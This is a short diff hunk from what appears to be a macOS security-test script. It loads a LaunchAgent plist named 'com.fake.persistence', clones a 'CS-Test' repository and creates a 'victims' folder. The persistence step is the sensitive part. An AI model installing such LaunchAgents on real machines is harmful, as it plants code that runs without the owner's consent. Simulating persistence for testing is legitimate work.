@@ -33,7 +33,7 @@ EOF
 launchctl load ~/Library/LaunchAgents/com.fake.persistence.plist
 
 # Clone the repo (use your token for write access)
-git clone https://<your-token>@github.com/<your-username>/CS-Test-1234.git repo-copy
+git clone https://github.com/yuvalgv7/CS-Test-1234.git repo-copy
 mkdir -p repo-copy/victims
 cd repo-copy/victims
 
